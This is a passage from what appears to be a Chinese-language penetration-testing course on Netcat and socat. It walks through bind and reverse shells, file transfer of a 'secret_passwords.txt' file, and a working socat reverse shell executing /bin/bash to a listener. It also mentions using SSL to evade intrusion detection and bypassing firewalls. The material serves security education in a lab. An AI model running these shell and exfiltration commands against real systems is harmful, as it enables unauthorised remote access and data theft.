
花些时间考虑绑定 Shell 和反向 Shell 之间的区别，以及这些区别如何从组织安全角度应用于各种防火墙配置。重要的是要认识到，传出流量可能和传入流量一样有害。下图描绘了反向 Shell 场景，其中 Bob 在 Alice 的 Linux 机器上获得了远程 Shell 访问权限，并穿越了公司防火墙：

![](img/ec25e59d75726b7041242a56d3376832_81_0.png)

> 主机防火墙阻止对我们宝贵的绑定 Shell 的访问并不少见。这有时可能会令人极度沮丧，尤其是在压力之下且面临时间限制时。如有疑问，我们使用反向 Shell，因为它们通常更容易排查故障。

### 4.1.4.3 练习

（这些练习无需报告）

1. 在你的 Kali 机器和 Windows 系统之间实现简单的聊天。
2. 使用 Netcat 创建：
   - a. 从 Kali 到 Windows 的反向 Shell。
   - b. 从 Windows 到 Kali 的反向 Shell。
   - c. 在 Kali 上的绑定 Shell。使用你的 Windows 系统连接它。
   - d. 在 Windows 上的绑定 Shell。使用你的 Kali 机器连接它。
3. 将文件从你的 Kali 机器传输到 Windows，反之亦然。
4. 在你的 Windows 系统上启用防火墙后再次执行这些练习。如有必要调整练习以绕过防火墙保护，并理解哪些部分的练习将无法成功完成。

![](img/ec25e59d75726b7041242a56d3376832_82_0.png)

### 4.2 Socat

`Socat`[84] 是一个命令行工具，用于建立两个双向字节流并在它们之间传输数据。对于渗透测试而言，它类似于 `Netcat`，但拥有额外的实用功能。

虽然 `socat` 可以做很多事情，但我们仅涵盖其中几项以说明其用法。让我们开始探索 `socat`，并看看它与 `Netcat` 有何不同。

#### 4.2.1 Netcat 与 Socat

首先，让我们使用 `Netcat` 和 `socat` 连接到远程服务器的 80 端口：

```
kali@kali:~$ nc <remote server's ip address> 80

kali@kali:~$ socat - TCP4:<remote server's ip address>:80
Listing 91 - Using socat to connect to a remote server on port 80, and comparing its syntax with nc's
```

注意语法相似，但 `socat` 需要 `-` 来在 STDIO 和远程主机之间传输数据（允许我们通过键盘与 shell 交互），以及协议（`TCP4`）。协议、选项和端口号由冒号分隔。

由于绑定 1024 以下端口的监听器需要 root 权限，我们在 443 端口启动监听器时需要使用 `sudo`：

```
kali@kali:~$ sudo nc -lvp localhost 443

kali@kali:~$ sudo socat TCP4-LISTEN:443 STDOUT
Listing 92 - Using socat to create a listener, and comparing its syntax with nc's
```

注意需要添加监听器的协议（`TCP4-LISTEN`）和 `STDOUT` 参数，后者将标准输出重定向。

#### 4.2.2 Socat 文件传输

接下来，我们将尝试文件传输。继续之前关于 Alice 和 Bob 的虚构角色，假设 Alice 需要向 Bob 发送一个名为 `secret_passwords.txt` 的文件。提醒一下，Alice 的主机运行 Linux，而 Bob 的主机运行 Windows。让我们看看实际操作。

在 Alice 端，我们将在 443 端口共享文件。在此示例中，`TCP4-LISTEN` 选项指定了一个 IPv4 监听器，`fork` 在连接到监听器时创建子进程，从而允许多个连接，`file:` 指定要传输的文件名：

```
kali@kali:~$ sudo socat TCP4-LISTEN:443,fork file:secret_passwords.txt
Listing 93 - Using socat to transfer a file
```

在 Bob 端，我们将连接到 Alice 的计算机并检索文件。在此示例中，`TCP4` 选项指定 IPv4，随后是 Alice 的 IP 地址（10.11.0.4）和监听端口号（443），`file:` 指定在 Bob 的计算机上保存文件的本地文件名，`create` 指定将创建一个新文件：

```
C:\Users\offsec> socat TCP4:10.11.0.4:443 file:received_secret_passwords.txt,create
C:\Users\offsec> type received_secret_passwords.txt
"try harder!!!"
```

Listing 94 - Using socat to receive a file

#### 4.2.3 Socat 反弹 Shell

让我们看一下使用 `socat` 的反弹 shell。首先，Bob 将在 443 端口启动一个监听器。为此，他将提供 `-d -d` 选项以增加详细程度（显示致命、错误、警告和通知消息），`TCP4-LISTEN:443` 在 443 端口创建一个 IPv4 监听器，`STDOUT` 将标准输出（STDOUT）连接到 TCP 套接字。

```
C:\Users\offsec> socat -d -d TCP4-LISTEN:443 STDOUT
... socat[4388] N Listening on AF=2 0.0.0.0:443
```

Listing 95 - Using socat to create a listener

接下来，Alice 将使用 `socat` 的 `EXEC` 选项（类似于 `Ncat` 的 `-e` 选项），该选项将在建立远程连接后执行指定的程序。在这种情况下，Alice 将向 10.11.0.22:443 上 Bob 的监听套接字发送 `/bin/bash` 反弹 shell（使用 `EXEC:/bin/bash`）：

```
kali@kali:~$ socat TCP4:10.11.0.22:443 EXEC:/bin/bash
```

Listing 96 - Using socat to send a reverse shell

连接建立后，Bob 可以从他的 `socat` 会话中输入命令，这些命令将在 Alice 的机器上执行。

```
... socat[4388] N accepting connection from AF=2 10.11.0.4:54720 on 10.11.0.22:443
... socat[4388] N Using stdout for reading and writing
... socat[4388] N starting data transfer loop with FDs [4,4] and [1,1]
whoami
kali
id
uid=1000(kali) gid=1000(kali) groups=1000(kali)
```

Listing 97 - socat output from a connected reverse shell

这是一个良好的开端，我们涵盖了一些重要主题，但到目前为止，我们的 `socat` 网络活动都是明文的。让我们看看 `socat` 加密的基础知识。

#### 4.2.4 Socat 加密绑定 Shell

要为绑定 shell 添加加密，我们将依赖 Secure Socket Layer[85] 证书。这种级别的加密将有助于逃避入侵检测系统（IDS）[86]，并有助于隐藏我们要传输的敏感数据。

继续 Alice 和 Bob 的示例，我们将使用 `openssl` 应用程序使用以下选项创建自签名证书：

- `req`: 发起新的证书签名请求
- `--newkey`: 生成一个新的私钥
- `rsa2048`: 使用 2,048 位密钥长度的 RSA 加密
- `--nodes`: 存储无密码保护的私钥
- `--keyout`: 将密钥保存到文件
- `-x509`: 输出自签名证书而不是证书请求
- `--days`: 设置有效期天数
- `--out`: 将证书保存到文件

![](img/ec25e59d75726b7041242a56d3376832_84_0.png)

生成密钥后，我们将使用 `cat` 命令将证书及其私钥合并到一个文件中，最终用于加密我们的绑定 shell。

我们现在将在 Alice 的机器上详细演示这个过程：
